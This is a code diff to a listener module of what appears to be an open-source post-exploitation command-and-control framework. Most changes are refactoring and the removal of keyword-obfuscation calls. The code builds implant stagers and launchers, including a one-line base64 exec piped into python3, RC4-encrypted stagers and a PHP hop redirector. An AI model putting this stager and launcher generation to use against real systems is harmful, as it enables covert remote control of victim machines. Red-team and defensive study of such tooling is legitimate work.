@@ -223,16 +223,14 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            else:
-                # otherwise return the case-randomized stager
-                return stager
+            # otherwise return the case-randomized stager
+            return stager
 
         if language in ["python", "ironpython"]:
             # Python
@@ -315,23 +313,18 @@ class Listener:
                 launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                     launcherBase
                 )
-                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                    launcherBase
-                )
 
             if encode:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                     "UTF-8"
                 )
-                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
-                return launcher
-            else:
-                return launcherBase
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
+            return launcherBase
 
-        else:
-            log.error(
-                "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
-            )
+        log.error(
+            "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -389,10 +382,6 @@ class Listener:
             }
             stager = template.render(template_options)
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            if obfuscate:
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -417,20 +406,18 @@ class Listener:
                 stager = self.mainMenu.obfuscationv2.obfuscate(
                     stager, obfuscation_command=obfuscation_command
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
             # if/else statements are irrelevant
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
                     RC4IV + staging_key, stager.encode("UTF-8")
                 )
-            else:
-                return stager
+            return stager
 
         if language in ["python", "ironpython"]:
             template_path = [
@@ -459,7 +446,6 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -470,14 +456,13 @@ class Listener:
                 return RC4IV + encryption.rc4(
                     RC4IV + staging_key.encode("UTF-8"), stager.encode("UTF-8")
                 )
-            else:
-                # otherwise return the standard stager
-                return stager
+            # otherwise return the standard stager
+            return stager
 
-        else:
-            log.error(
-                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
+        log.error(
+            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
@@ -497,46 +482,45 @@ class Listener:
         """
         host = listenerOptions["Host"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/http.ps1")
-
-                template_options = {
-                    "session_cookie": "",
-                    "host": host,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/comms.py")
-
-                template_options = {
-                    "session_cookie": "",
-                    "host": host,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            else:
-                log.error(
-                    "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
-                )
-        else:
+        if not language:
             log.error("listeners/http_hop generate_comms(): no language specified!")
+            return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "session_cookie": "",
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/comms.py")
+
+            template_options = {
+                "session_cookie": "",
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def start(self):
         """
@@ -547,51 +531,48 @@ class Listener:
         redirectListenerName = self.options["RedirectListener"]["Value"]
         redirectListenerOptions = data_util.get_listener_options(redirectListenerName)
 
-        if redirectListenerOptions:
-            self.options["RedirectStagingKey"]["Value"] = (
-                redirectListenerOptions.options["StagingKey"]["Value"]
-            )
-            self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
-                "DefaultProfile"
-            ]["Value"]
-            redirectHost = redirectListenerOptions.options["Host"]["Value"]
-
-            uris = list(
-                self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
-            )
-
-            hopCodeLocation = "%s/data/misc/hop.php" % (self.mainMenu.installPath)
-            with open(hopCodeLocation) as f:
-                hopCode = f.read()
-
-            hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
-            hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])
-
-            saveFolder = self.options["OutFolder"]["Value"]
-            for uri in uris:
-                saveName = f"{saveFolder}{uri}"
-
-                # recursively create the file's folders if they don't exist
-                if not os.path.exists(os.path.dirname(saveName)):
-                    try:
-                        os.makedirs(os.path.dirname(saveName))
-                    except OSError as exc:  # Guard against race condition
-                        if exc.errno != errno.EEXIST:
-                            raise
-
-                with open(saveName, "w") as f:
-                    f.write(hopCode)
-                    log.info(
-                        f"Hop redirector written to {saveName} . Place this file on the redirect server."
-                    )
-
-            return True
-
-        else:
+        if not redirectListenerOptions:
             log.error(
                 f"Redirect listener name {redirectListenerName} not a valid listener!"
             )
             return False
+
+        self.options["RedirectStagingKey"]["Value"] = redirectListenerOptions.options[
+            "StagingKey"
+        ]["Value"]
+        self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
+            "DefaultProfile"
+        ]["Value"]
+        redirectHost = redirectListenerOptions.options["Host"]["Value"]
+
+        uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))
+
+        hopCodeLocation = f"{self.mainMenu.installPath}/data/misc/hop.php"
+        with open(hopCodeLocation) as f:
+            hopCode = f.read()
+
+        hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
+        hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])
+
+        saveFolder = self.options["OutFolder"]["Value"]
+        for uri in uris:
+            saveName = f"{saveFolder}{uri}"
+
+            # recursively create the file's folders if they don't exist
+            if not os.path.exists(os.path.dirname(saveName)):
+                try:
+                    os.makedirs(os.path.dirname(saveName))
+                except OSError as exc:  # Guard against race condition
+                    if exc.errno != errno.EEXIST:
+                        raise
+
+            with open(saveName, "w") as f:
+                f.write(hopCode)
+                log.info(
+                    f"Hop redirector written to {saveName} . Place this file on the redirect server."
+                )
+
+        return True
 
     def shutdown(self, name=""):
         """
